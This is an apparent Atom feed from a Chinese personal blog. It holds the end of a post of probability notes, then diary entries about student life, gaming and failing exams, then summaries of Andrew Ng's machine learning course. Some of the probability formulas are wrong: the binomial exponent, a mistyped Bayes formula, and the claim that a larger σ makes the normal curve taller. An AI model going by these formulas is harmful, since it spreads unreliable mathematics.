&lt;li&gt;&lt;span class="math"&gt;\(P(A \bigcup B) = P(A) + P(B) - P(AB)\)&lt;/span&gt;  &lt;/li&gt;
&lt;li&gt;上面公式可以推广到N个事件  &lt;/li&gt;
&lt;li&gt;&lt;span class="math"&gt;\(P(B \mid A)  = \frac{P(AB)}{P(A)}\)&lt;/span&gt;  &lt;/li&gt;
&lt;li&gt;&lt;span class="math"&gt;\(P(A) = P(AB)+P(A \bar B) = P(B) \cdot P(A|B) + P(\bar B) \cdot P(A| \bar B)\)&lt;/span&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;全概率公式&lt;/h5&gt;
&lt;p&gt;&lt;span class="math"&gt;\(B_i\)&lt;/span&gt; 是&lt;span class="math"&gt;\(S\)&lt;/span&gt;的完备事件组  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(P(A) = \sum_{i=1}^n P(B_i)P(A|B_i)\)&lt;/span&gt;   &lt;/p&gt;
&lt;h5 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;贝叶斯公式&lt;/h5&gt;
&lt;p&gt;&lt;span class="math"&gt;\(P(B_k|A) = {P(B_k A) \over P(A)} = {P(B_k)P(A|P(B_k) \over \sum_{j=1}^n P(B_j)P(A|B_j)}\)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id="_4"&gt;&lt;a name="user-content-_4" href="#_4" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;概率分布&lt;/h2&gt;
&lt;h4 id="0-1"&gt;&lt;a name="user-content-0-1" href="#0-1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;0-1分布&lt;/h4&gt;
&lt;p&gt;&lt;span class="math"&gt;\(X \sim 0 - 1\)&lt;/span&gt;  &lt;/p&gt;
&lt;h4 id="_5"&gt;&lt;a name="user-content-_5" href="#_5" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;二项分布&lt;/h4&gt;
&lt;p&gt;&lt;span class="math"&gt;\(P\{X= k\} = C_n^kp^k(1-p)^k\)&lt;/span&gt;  &lt;/p&gt;
&lt;p&gt;记作 &lt;span class="math"&gt;\(X \sim B(n,p)\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id="poisson"&gt;&lt;a name="user-content-poisson" href="#poisson" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;poisson分布&lt;/h4&gt;
&lt;p&gt;&lt;span class="math"&gt;\(P\{X= k\} = {e^{-\lambda}\lambda^k \over k!}\)&lt;/span&gt;  &lt;/p&gt;
&lt;p&gt;记作 &lt;span class="math"&gt;\(X \sim \pi(\lambda)\)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id="distribution-function"&gt;&lt;a name="user-content-distribution-function" href="#distribution-function" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Distribution function&lt;/h3&gt;
&lt;p&gt;&lt;span class="math"&gt;\(F(x) = P\{X \le x\}\)&lt;/span&gt;  &lt;/p&gt;
&lt;h3 id="probability-density-function"&gt;&lt;a name="user-content-probability-density-function" href="#probability-density-function" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;probability density function&lt;/h3&gt;
&lt;p&gt;&lt;span class="math"&gt;\(f(x)\)&lt;/span&gt; 是概率密度函数&lt;br /&gt;
满足  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(P\{X \in D\} = \int_{D} f(x) {dx}\)&lt;/span&gt;  &lt;/p&gt;
&lt;h3 id="_6"&gt;&lt;a name="user-content-_6" href="#_6" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;分布&lt;/h3&gt;
&lt;h4 id="_7"&gt;&lt;a name="user-content-_7" href="#_7" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;均匀分布&lt;/h4&gt;
&lt;p&gt;f(x) = 1/(b-a),  x在（a,b)内， 其他的地方为0  &lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(X \sim U(a,b)\)&lt;/span&gt;  &lt;/p&gt;
&lt;h4 id="normal"&gt;&lt;a name="user-content-normal" href="#normal" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;正态分布 （normal）&lt;/h4&gt;
&lt;p&gt;&lt;span class="math"&gt;\(X \sim N(\mu, \sigma^2)\)&lt;/span&gt;  &lt;/p&gt;
&lt;p&gt;性质&lt;br /&gt;
- f(x) 关于 &lt;span class="math"&gt;\(x=\mu\)&lt;/span&gt; 对称&lt;br /&gt;
- &lt;span class="math"&gt;\(\sigma\)&lt;/span&gt;越大, 最大值越大, 就是越瘦高.  &lt;br /&gt;
- N(0, 1) 是标准正态分布  &lt;/p&gt;
&lt;h4 id="_8"&gt;&lt;a name="user-content-_8" href="#_8" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;指数分布&lt;/h4&gt;
&lt;p&gt;&lt;span class="math"&gt;\(f(x) = \lambda e^{-\lambda x}\)&lt;/span&gt;, x&amp;gt;0  &lt;/p&gt;
&lt;p&gt;记作&lt;span class="math"&gt;\(X \sim E(\lambda)\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id="others"&gt;&lt;a name="user-content-others" href="#others" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;others&lt;/h4&gt;
&lt;p&gt;比如 Gamma分布， &lt;br /&gt;
&lt;span class="math"&gt;\(X \sim \Gamma(\alpha, \beta)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Beta 分布&lt;br /&gt;
&lt;span class="math"&gt;\(X \sim \beta(a, b)\)&lt;/span&gt;&lt;/p&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "left",
        indent = "0em",
        linebreak = "false";

    if (true) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</summary></entry><entry><title>药丸， 真的是药丸</title><link href="http://littlezz.github.io/yao-wan-zhen-de-shi-yao-wan.html" rel="alternate"></link><updated>2016-01-27T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-01-27:yao-wan-zhen-de-shi-yao-wan.html</id><summary type="html">&lt;p&gt;今天浪了一天， 不懂在干什么， 本来说要补一波概率论的， 结果看到第4章之后就开始乱翻书了， 然后统计学习基础那本书根本就没有看， 昨天看到『前列腺癌』的例子， 今天还是这个例子。 我很关心男性前列腺癌嘛啊？  &lt;/p&gt;
&lt;p&gt;感觉真的药丸。  &lt;/p&gt;
&lt;p&gt;昨天和手榴弹去吃KFC， 作死的点了一个全家桶， 嘛， 作为肥宅， kfc当然要刷全家桶啦。  &lt;/p&gt;
&lt;p&gt;结果就是吃得快吐了， 肥宅力不足嘛。&lt;br /&gt;
人家A岛上的肥宅都是单刷全家桶， 结果我们两个人也搞不完一个， 主要是汉堡， 简直是想象不出的难吃， 等吃到汉堡的时候， 进入嘴巴的东西基本已经没有什么味道了， 可是汉堡的那个面包， 用蛋蛋的话来说叫做『面饼』， （里面夹着的东西叫做『肉饼』）， 真是难吃， 难吃， 难吃。  &lt;/p&gt;
&lt;p&gt;我偷偷留了两口没有吃完， 藏在汉堡盒子里面， 结果在战斗结束拍纪念照的时候被我弄了出来， 蛋蛋惊呼：『卧槽， 你作弊！居然还藏了半个面饼！』  &lt;/p&gt;
&lt;p&gt;纪念照是以冷漠的肥宅为主题， 通过拍摄在成堆的K记包装盒于凌乱的可乐杯后面低头玩手机的男人， 表现肥宅刷完全家桶事后玩手机的冷漠之情。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="肥宅" src="../images/IMG_0593.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;饭后， 天早已经全黑，走在回去的路上， 我早已直不起腰， 就算是还剩10秒的绿灯也只能放弃， 停下来等待。  &lt;/p&gt;
&lt;p&gt;世界一下子陷入了缓慢的行动之中。  在这样的节奏之中， 却还是能够超过那些男女成群嘻嘻哈哈的路人，  &lt;/p&gt;
&lt;p&gt;在一个十字路口之前， 蛋蛋提到了毕业， 我连能不能毕业都不知道， 这学期估计要吃退学警告咯， 我哈哈的回应道。  &lt;/p&gt;
&lt;p&gt;蛋蛋自己也挂了两科， 而且是考试全部都会， 但是因为没有平时分， 结果就被老师给挂了。  &lt;/p&gt;
&lt;p&gt;操， 大不了就延毕呗。  &lt;/p&gt;
&lt;p&gt;不知道为何这句压在我心口的话语经他之口说出来之后， 我一下子轻松了非常多。 &lt;/p&gt;
&lt;p&gt;人流在十字路口前面聚集， 在红绿灯的结束时间通过是基本规则， 没有人在乎你是不是撑得快死了。  &lt;/p&gt;
&lt;p&gt;在下一个红绿灯再过马路有什么问题？&lt;br /&gt;
如果不过红绿灯会怎么样？  &lt;/p&gt;
&lt;p&gt;我不知道到。  &lt;/p&gt;
&lt;p&gt;他们说， 山崩地裂， 日月无光。&lt;br /&gt;
他们说， 你本来有一个美好的前途。&lt;br /&gt;
他们说， 你完蛋定了啊。  &lt;/p&gt;
&lt;p&gt;说完这些之后， 继续投身于和小贩对青菜能不能少一毛钱的战斗之中。  &lt;/p&gt;
&lt;p&gt;我看着远处的猪肉摊， 肉头堆积成山， 屠户把猪头奋力的塞进黑色的袋子里面， 对太大的头， 用刀切成两半， 手起刀落， 骨肉四溅。 &lt;/p&gt;
&lt;p&gt;在那一刻， 他是否有感受到， 大千世界曾由他主宰的快感？  &lt;/p&gt;
&lt;p&gt;在那一刻， 他们是不是也因此产生了参透世界，看破轮回的感觉， 于是有了对他人做出预言的底气。  &lt;/p&gt;
&lt;p&gt;我不知道如何回应， 我也不知道路的那头有什么， 途中会有弹射起步的跑车路过么？ 会中出一架大卡车么？  &lt;/p&gt;
&lt;p&gt;这个学期， 加入的公司没有融到钱， 团队解散了， 但是我好歹也达成了筹够去日本剁手的钱的目的。   &lt;/p&gt;
&lt;p&gt;干了一个学期， 目的是达成了， 自己也开始有了新的作死计划， 开始看起了机器学习， 两年前， 我还在嚷嚷着， 写程序要什么数学？&lt;br /&gt;
两年后， 我看着那些书中中出的各种的公式， 简直就像是被中出一样。  &lt;/p&gt;
&lt;p&gt;摸摸自己的额头， 擦了把汗， 我果然还是想要试一下啊。&lt;br /&gt;
于是Ng的课算是上完了， 你要问我记住了什么， 说一句实话， 对不起，什么也没有记住。  &lt;/p&gt;
&lt;p&gt;毕不了业， 药丸， 毕得了业， 之后等着的也是找工作， 下一个十字路口，药丸。 找到了工作， 浑水摸鱼， 虚度光阴， 药丸。  摸滚打爬， 事业有成， 娶不到老婆， 药丸。  取到了老婆， 以前吃的化学添加剂太多， 生不出小孩， 药丸。  小孩成绩不好， 药丸。&lt;br /&gt;
事业有成， 取了老婆， 生了小孩， 头发掉光了， 药丸。&lt;br /&gt;
腰酸背痛， 药丸。&lt;br /&gt;
前列腺炎， 药丸。&lt;br /&gt;
老眼昏花， 药丸。&lt;br /&gt;
年事已高， 大小便失禁， 卧床不起， 病房外的小孩因为一个发烧感冒要打针吃药就大喊大叫的， 看着自己浑身插满的管子， &lt;br /&gt;
这一次没有人说你药丸了。  &lt;/p&gt;
&lt;p&gt;但是你我都知道，这下是真的要完了。  &lt;/p&gt;
&lt;p&gt;弗洛伊德分析法， 我们总是药丸。&lt;br /&gt;
不管做什么， 只要『他们』想， 你都是药丸。  &lt;/p&gt;
&lt;p&gt;和蛋蛋在十字路口道别， 我转身没入小区的夜色之中， 在回去的路上， 我已经放弃思考『为什么 &lt;strong&gt;他们&lt;/strong&gt; 总是赢？』这样无解的问题了。   &lt;br /&gt;
蛋蛋说， 赶紧回去， 我要去杀僵尸了， 一斧子砍爆僵尸的头。 特别爽。 &lt;br /&gt;
我也赶着回去捞新船。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;让一让, 母牛们, 人生短暂啊!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当他的奶牛们疯狂繁殖， 每天开着宴会， 结果吃得差点撑死。&lt;br /&gt;
当他真的需要钱给女儿上学的时候， 奶牛却不在繁殖， 失去了上帝眷顾的又老又聋的他和情人挨家挨户的卖自己徒手制作的小彩票。  最后病死。&lt;/p&gt;
&lt;p&gt;随着年龄的增长和阅历的增加， 我越来越觉得这个世界的疯狂程度，有过之而无不及。  &lt;/p&gt;
&lt;p&gt;教授问我， 啊？你怎么现在就出去工作了？ 我干笑。&lt;br /&gt;
公司的运营总监问我， 你还没有毕业啊？你的工作就是给CTO打杂的么？  我笑笑。  &lt;/p&gt;
&lt;p&gt;面对『他们』发出的这种疑问， 这种暴露自己早已没有任何想象力的疑问， 以及发生的很多事情， 挂科也好， 作为差生中的差生也好， 其实我他妈是不服的。&lt;br /&gt;
我没有那种生来就上天入地扭曲现实的能力，但是却也不认为是被上帝抛弃的人，    &lt;/p&gt;
&lt;p&gt;或许， 这就是普通吧。  &lt;/p&gt;
&lt;p&gt;普通的焦虑着。  &lt;br /&gt;
普通的痛苦着。 &lt;br /&gt;
普通的挣扎着。  &lt;/p&gt;
&lt;p&gt;正因为普通， 所以为了不沦落成『他们』， 不得不经历不普通的事情， 为了在以后， 能遇上和自己一样挣扎的普通人。  &lt;/p&gt;
&lt;p&gt;说说那天接下来的事情吧， 之后我回家就接着玩船去了， 吃得撑了，加上玩了3个小时， 而且有差不多一个小时都在刷同一个图（1-5），精神已经恍惚了， 结果大破进击了。  &lt;/p&gt;
&lt;p&gt;我之前有一点犹豫， 迷迷糊糊的，不确定到底有没有大破， 当选完阵型， 看到我大破的小学生的时候， 我整个人一下就蒙蔽了， 吓出了一身冷汗， 『卧槽， 我要粪提了』， 赶紧F5， 重进游戏之后看到自己的小学生还在。 松了一口气， 事后大佬告诉我在选阵型之前F5才有效， 这次存粹是运气好吧了。  &lt;/p&gt;
&lt;p&gt;差点药丸， 运气好而已， 但是如果真的沉船了， 可能我也会和基友倾诉一下， 药丸药丸，然后接着玩下去。  &lt;/p&gt;
&lt;p&gt;药丸。&lt;br /&gt;
药丸。  &lt;/p&gt;
&lt;p&gt;虽然各种药丸， 一不小心就药丸。但是还是得走下去， 因为，   &lt;/p&gt;
&lt;p&gt;当我们大喊着药丸的时候，你我都知道， 这还不是真正的 &lt;strong&gt;要完&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;2016年01月28日03:32:37&lt;/p&gt;</summary><category term="里人格"></category><category term="日记"></category><category term="瞎扯"></category></entry><entry><title>Ng Machine Learning Week 11</title><link href="http://littlezz.github.io/ng-machine-learning-week-11.html" rel="alternate"></link><updated>2016-01-24T20:04:20+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-01-24:ng-machine-learning-week-11.html</id><summary type="html">&lt;p&gt;第十一周说的是处理图片， 介绍了滑动窗口， 如何获得（制造）更多的数据， 还有在pipeline 中的上限分析， 这个是用来决定在系统中应该跟加关心那些模块的优化， 哪些模块就算优化了效果也比较小。  当然了， 喜闻乐见的黑了一下『我认识的人』， 花了18个月去优化一个没有太大效果的模块。  &lt;/p&gt;
&lt;h4 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;滑动窗口&lt;/h4&gt;
&lt;p&gt;图片处理的时候是训练识别一小块， 然后滑动窗口来在大图中寻找是否找到。 比如你的样本都是 10x10 的大小， 然后等比例缩放， 在原图中你也可以找 50x50 的, 但是对于这个范围， 你得缩小到10x10， 然后在来识别。  &lt;/p&gt;
&lt;h4 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;展开&lt;/h4&gt;
&lt;p&gt;里面还顺带提及了， 什么展开（好吧我不记得具体的名字了）， 在识别图像里面的文字的时候， 首先要找到包含文字的区域， 比如标记为白色， 然后这些白色向周围扩散， 比如20个像素点， 如果这之中也有其他的文字区域（即白色）， 着把他们连成一块大的白色区域。&lt;/p&gt;
&lt;h4 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;制造数据&lt;/h4&gt;
&lt;p&gt;用现有样本， 加上噪声之类的， 得到新的训练数据。&lt;br /&gt;
他建议在解决问题前， 先算一下如果我要得到10倍的训练数据， 我需要多大的代价， 比如人工10秒做一次判断， 那么如果我有新的10k条数据， 可能就是人工工作几天， 但是我得到了更加多的数据， 也就是说， 我的训练结果得到了一个巨大的提升。   &lt;/p&gt;
&lt;h4 id="_4"&gt;&lt;a name="user-content-_4" href="#_4" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;上限分析&lt;/h4&gt;
&lt;p&gt;先要模块化， 然后重头开始给于一个模块绝对正确的预测结果给下一个模块， 计算其中系统正确率的变化。  &lt;/p&gt;
&lt;p&gt;然后就可以明确的知道哪些模块不需要花精力啦（&lt;del&gt;前提是你得弄成pipeline， 一般自己写的话都是大杂烩吧&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;同时不忘黑那个18个月的哥们，&lt;del&gt;这家伙我好想在第一周的时候感觉就听说过他了&lt;/del&gt;。&lt;/p&gt;
&lt;h4 id="_5"&gt;&lt;a name="user-content-_5" href="#_5" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;终结&lt;/h4&gt;
&lt;p&gt;最后的最后， Andrew 结束词的时候， 我非常的感动（才没有哭！）， 这是我大学之后， 上过的第一门真正体现『传道， 授业， 解惑』的课。&lt;del&gt;（大学上的那个不叫课， 叫吃屎）&lt;/del&gt; &lt;/p&gt;
&lt;p&gt;我还记得第三周的时候， 介绍各种优化， 他坦然的承认自己搞了10年对于这些优化也是最近才渐渐明白里面的原理， 我隔着屏幕， 跨越时空， 哈哈哈的笑着。  &lt;/p&gt;
&lt;p&gt;我还记得， 当我们上完线性回归和logic回归的时候， 他说， 你们现在已经比大多数硅谷工作的工程师更加懂机器学习了， 他们中有很多人靠机器学习赚到了许多钱， 或者帮助公司取得成功。 然后露出一个诙谐的笑容时候， 我也跟着笑着， 这家伙， 整天黑硅谷的人。  &lt;/p&gt;
&lt;p&gt;我还记得当他鼓励完我们， 接着告诉我们， 他还有更厉害的东西要教授我们的时候， 我真的觉得接下来要得到巨大力量， 倍感兴奋。 &lt;/p&gt;
&lt;p&gt;就在最后， 他说， 同学们， 谢谢你们， 我知道你们当中很多人花了大量的时间的来学习， 同时花了大量的时间做哪些长度很长的编程题目，希望你们能在自己的领域利用机器学习取得成功， 希望你们能够让更多的人生活得更美好的时候。  &lt;/p&gt;
&lt;p&gt;我觉得这个祝福一点也不畸形， 我觉得他有资格对他的学生们说希望你们改变世界， 当他说出这句话的时候， 我没有丝毫的觉得矫揉造作， 而是觉得， 理应如此。&lt;/p&gt;
&lt;p&gt;因为，&lt;br /&gt;
师者，传道授业解惑者也。  &lt;/p&gt;
&lt;p&gt;我知道我已经严重偏题了， 这些东西都应该归类到个人日记那一块， 而且我也知道反正也没有人看，但是我还是想在一个属于『公开』的地方， 写下此时此刻的想法。  &lt;/p&gt;
&lt;p&gt;我觉得人的能力真的不是最重要的， 最重要的是他对这个世界， 对其他的人，对周边的事物还存有的一份爱意， 还相信自己在任何情况下都存在着可能性。&lt;br /&gt;
这些才是最重要的， 那些所谓的能力， 终究是科学训练的产物， 这个世界对于我们真正的考验， 是科学之外的东西。  &lt;/p&gt;
&lt;p&gt;所以， 爱因斯坦说， &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个人在智力上的成就很大程度上取决于人格的伟大，这一点往往超出人们通常的认识。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因为，我们还有很长的路要走。&lt;/p&gt;
&lt;p&gt;以上。  &lt;/p&gt;
&lt;p&gt;2016年01月24日21:29:36&lt;/p&gt;</summary><category term="机器学习"></category><category term="瞎扯"></category></entry><entry><title>Ng Machine Learning Week 10</title><link href="http://littlezz.github.io/ng-machine-learning-week-10.html" rel="alternate"></link><updated>2016-01-24T14:49:33+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-01-24:ng-machine-learning-week-10.html</id><summary type="html">&lt;p&gt;总结一下第10周， 之前看的都没有总结（←懒   &lt;/p&gt;
&lt;p&gt;第十周已经开始不怎么说算法了， 这次说的是对于大数据集的处理， 之前那种每次都对所有数据集做计算的称为batch， 现在这个（stochastic）是每次只对一个样例找最优值， 遍历完所有样例之后也会趋向于全局最优， 会在他的旁边震荡， 这个时候可以动态的减少学习效率 (alpha)   &lt;/p&gt;
&lt;p&gt;之后说了mini-batch， 就是stochastic 和batch的混合版， 每次只训练一小部分样例。&lt;/p&gt;
&lt;p&gt;然后在线的学习其实感觉就是stochastic， 每次都对一个新的样本训练， 然后丢弃。  &lt;/p&gt;
&lt;p&gt;之后是map reduce， 这个没有什么好说的了， 分布式计算， 或者并行的多核计算， 分布式要考虑网络带宽等问题， 虽然视频说多核的不用考虑带宽， 但是实际上核心之间的通信也要消耗时间， 最终可能每个核心只能快80%吧。  &lt;/p&gt;
&lt;p&gt;map reduce的使用需要计算的时候数据能够分割， 一般是有 Σ 这种求和公式的时候使用。  &lt;/p&gt;
&lt;p&gt;嘛。  &lt;/p&gt;
&lt;p&gt;2016年01月24日14:42:29&lt;/p&gt;</summary><category term="机器学习"></category></entry><entry><title>ML-ex8</title><link href="http://littlezz.github.io/ml-ex8.html" rel="alternate"></link><updated>2016-01-24T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-01-24:ml-ex8.html</id><summary type="html">&lt;p&gt;今天撸了Ng的机器学习的第九周的作业。 课之前看了， 作业拖到我学校的考试周结束了才做。 诶一提起这个就想到我挂科估计要挂到退学警告了。。。  &lt;/p&gt;
&lt;p&gt;这一周的是关于异常检查和推荐系统的， 协同过滤我之前看过诶， 和这个不一样， Ng还是求那个gradient 什么鬼的， 可是我在另一篇&lt;a href="http://www.salemmarafi.com/code/collaborative-filtering-with-python/"&gt;文章&lt;/a&gt;里面看到的是另一个东西。&lt;/p&gt;
&lt;p&gt;他也是用movie作为行， 用户作为列， 而且是用户直接当做了feature， 然后算两个movie之间的距离， 不过这样说来， 好像和机器学习就没有关系了。。。  &lt;/p&gt;
&lt;p&gt;另外， 每次做作业的感觉其实就是， 我不会机器学习， 我只是公式的搬运工....  T_T  &lt;/p&gt;
&lt;p&gt;说一下搬运工的心得吧。&lt;br /&gt;
今天把公式转换成矩阵的向量运算的时候折腾了好久。  &lt;/p&gt;
&lt;p&gt;后来我还是没有发现什么取巧的办法， google了一下也没有找到好的技巧（←其实就找了一下）， 总结起来， 还是pdf里面说的  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先用for 循环&lt;/li&gt;
&lt;li&gt;2维的可以直接matrix&lt;/li&gt;
&lt;li&gt;3维带一个for loop&lt;/li&gt;
&lt;li&gt;&lt;del&gt;一般矩阵相乘形式上正确结果就是正确的&lt;/del&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实我花了半个小时在想如何消除3层嵌套的for循环。  /(ㄒoㄒ)/~~  &lt;/p&gt;
&lt;p&gt;嘛， 接着看吧。（&lt;del&gt;弱逼不敢乱说话&lt;/del&gt;）  &lt;/p&gt;
&lt;p&gt;2016年01月24日00:57:49&lt;/p&gt;</summary><category term="机器学习"></category></entry><entry><title>喂喂，有人在吗？</title><link href="http://littlezz.github.io/wei-wei-you-ren-zai-ma.html" rel="alternate"></link><updated>2016-01-22T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-01-22:wei-wei-you-ren-zai-ma.html</id><summary type="html">&lt;p&gt;&lt;img alt="" src="../images/39556174.jpg" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;在一年前就想弄一个记录一些东西的地方了， 经历了使用django的cms（最后作罢）， 自己写一个博客网站（前端太丑， 作罢）， 到现在用静态的博客系统， 当然， 这个也曾因为一度没有办法选择使用什么主题而作罢。  &lt;/p&gt;
&lt;p&gt;直到最近， 硬着头皮， 一方面看完了所有的pelican的主题， 一方面告诫自己不要折腾， 最后选择了这个主题， 还算满意， 之后配置起来又是一顿折腾， 这里按下不表。  &lt;/p&gt;
&lt;p&gt;所以时至今日， 我也没有觉得自己能够『分分钟』写一个xx出来， 在遇到和漂亮或者所谓的审美有关的东西的时候， 我就立马进入无法选择的地步， 至于前面说的我自己写的博客系统， 大抵在『分页应该使用什么样式』这个问题上搁浅了。  &lt;/p&gt;
&lt;p&gt;于是我也时常在想， 我是不是不太适合和所谓的『美』有关。 我会基础的前端， 摁着我的头写我也写得出， bootstrap全世界样式基本一样， 也不能说丑， 但是没有『灵性』。 我见过有灵性的选手， 每次我不会写前端就问他， 然后他就一次次的证明， 我和他所接触的前端， 不是一个东西。  他总是能使用一种我闻所未闻的姿势， 来解决一个问题。 （当然也是我前端看得少）&lt;/p&gt;
&lt;p&gt;我也去搞过图形化， python的tk， 丑哭， python的kivy， 不稳定， ios的开发， 好像看了官网的第一个部分后来就不看了。  &lt;/p&gt;
&lt;p&gt;果然啊转了一圈， 还是命令行的进度条最他妈的性感了！  &lt;/p&gt;
&lt;p&gt;&lt;del&gt;香菜的笑容就由我来守护， 诸君， 亮剑吧！&lt;/del&gt;  &lt;/p&gt;
&lt;p&gt;扯远了， 我真正想要说的是， 我终于找到了一个地方， 描述自己的想法， 确切的记录自己半途而废而又不以之为耻的心情。  &lt;/p&gt;
&lt;p&gt;真他妈好。  &lt;/p&gt;
&lt;p&gt;2016年01月22日01:23:20&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;（图片p站id=39556174&lt;/p&gt;</summary><category term="瞎扯"></category><category term="日记"></category></entry></feed>